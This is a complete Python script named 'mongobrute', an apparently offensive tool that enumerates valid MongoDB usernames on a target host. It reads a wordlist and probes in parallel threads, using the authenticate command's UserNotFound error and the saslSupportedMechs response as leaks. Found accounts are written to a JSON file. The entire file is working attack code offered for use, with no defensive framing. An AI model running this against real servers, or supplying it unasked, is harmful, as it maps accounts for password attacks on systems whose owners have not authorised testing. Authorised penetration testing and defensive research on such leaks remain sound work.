#!/usr/bin/env python3
"""
mongobrute - MongoDB User Enumeration Tool
Vectors: authenticate command (UserNotFound leak), saslSupportedMechs in hello
"""

import argparse
import sys
import concurrent.futures
import json

try:
    from pymongo import MongoClient
    from pymongo.errors import PyMongoError, OperationFailure
    from pymongo import monitoring
except ImportError:
    print("[-] pymongo is required. Install with: pip install pymongo")
    sys.exit(1)

VERSION = "1.0.0"
BANNER = f"""
  __  ___           _                        _
 /  |/  /__  ___ __(_)__  ___ _  _  ___ _  _| |_ ___ _ _
 / /|_/ / _ \\/ _ `/ / _ \\/ _ \\ || |/ _ \\ || |  _/ _ \\ '_|
/_/  /_/\\___/\\__, /_\\___/\\___/\\_,_/\\___/\\_,_|\\__\\___/_|
            /____/  v{VERSION}
MongoDB User Enumeration Tool
"""


class _Suppress(monitoring.CommandListener):
    def started(self, event): pass
    def succeeded(self, event): pass
    def failed(self, event): pass


def check_authenticate(client, username, db):
    try:
        client.admin.command("authenticate", user=username, mechanism="SCRAM-SHA-256", db=db)
        return True
    except OperationFailure as e:
        if e.code == 11 or "UserNotFound" in str(e):
            return False
        return True
    except PyMongoError:
        return None


def check_sasl(client, username, db):
    try:
        resp = client.admin.command({"hello": 1, "saslSupportedMechs": f"{db}.{username}"})
        return "saslSupportedMechs" in resp and len(resp["saslSupportedMechs"]) > 0
    except (PyMongoError, OperationFailure):
        return None


def probe(client, username, db):
    exists = check_authenticate(client, username, db)
    method = "authenticate" if exists is not None else ""
    if exists is None or not exists:
        sasl = check_sasl(client, username, db)
        if sasl is not None:
            exists = sasl
            method = "saslSupportedMechs"
    return username, exists, method


def main():
    parser = argparse.ArgumentParser(description="MongoDB User Enumeration Tool")
    parser.add_argument("-t", "--target", required=True, help="MongoDB host[:port]")
    parser.add_argument("-w", "--wordlist", required=True, help="Username wordlist file")
    parser.add_argument("-d", "--db", default="admin", help="Auth database (default: admin)")
    parser.add_argument("-T", "--threads", type=int, default=16, help="Threads (default: 16)")
    parser.add_argument("--timeout", type=int, default=5, help="Connection timeout in seconds (default: 5)")
    parser.add_argument("--tls", action="store_true", help="Use TLS")
    parser.add_argument("-o", "--output", help="Save results as JSON")

    args = parser.parse_args()

    print(BANNER)

    target = args.target if ":" in args.target else f"{args.target}:27017"

    try:
        with open(args.wordlist, "r", encoding="utf-8", errors="ignore") as f:
            usernames = [l.strip() for l in f if l.strip()]
    except FileNotFoundError:
        print(f"[-] Wordlist not found: {args.wordlist}")
        sys.exit(1)

    if not usernames:
        print("[-] Wordlist is empty")
        sys.exit(1)

    print(f"[*] Target:   {target}")
    print(f"[*] DB:       {args.db}")
    print(f"[*] Wordlist: {args.wordlist} ({len(usernames)} entries)")
    print(f"[*] Threads:  {args.threads}")
    print()

    monitoring.register(_Suppress())

    found = []
    total = len(usernames)
    done = 0

    def progress():
        nonlocal done
        done += 1
        if done % 10 == 0 or done == total:
            print(f"\r[*] Progress: {done}/{total} ({done*100//total}%)", end="", file=sys.stderr)
            sys.stderr.flush()

    def work(username):
        try:
            client = MongoClient(
                f"mongodb://{target}/",
                serverSelectionTimeoutMS=args.timeout * 1000,
                tls=args.tls,
            )
            result = probe(client, username, args.db)
            client.close()
            progress()
            return result
        except Exception as e:
            progress()
            return username, None, str(e)

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as ex:
        fs = {ex.submit(work, u): u for u in usernames}
        for f in concurrent.futures.as_completed(fs):
            try:
                username, exists, method = f.result()
                if exists:
                    found.append({"username": username, "method": method})
                    print(f"\r{' ' * 60}\r  [+] {username} (EXISTS) [{method}]")
            except Exception:
                pass

    print(f"\r{' ' * 60}\r")

    if found:
        print(f"[+] Found {len(found)} user(s):")
        for u in found:
            print(f"    {u['username']} [{u['method']}]")
    else:
        print("[-] No users found")

    if args.output and found:
        with open(args.output, "w") as f:
            json.dump({"target": target, "db": args.db, "users": found}, f, indent=2)
        print(f"\n[*] Results saved to {args.output}")


if __name__ == "__main__":
    main()
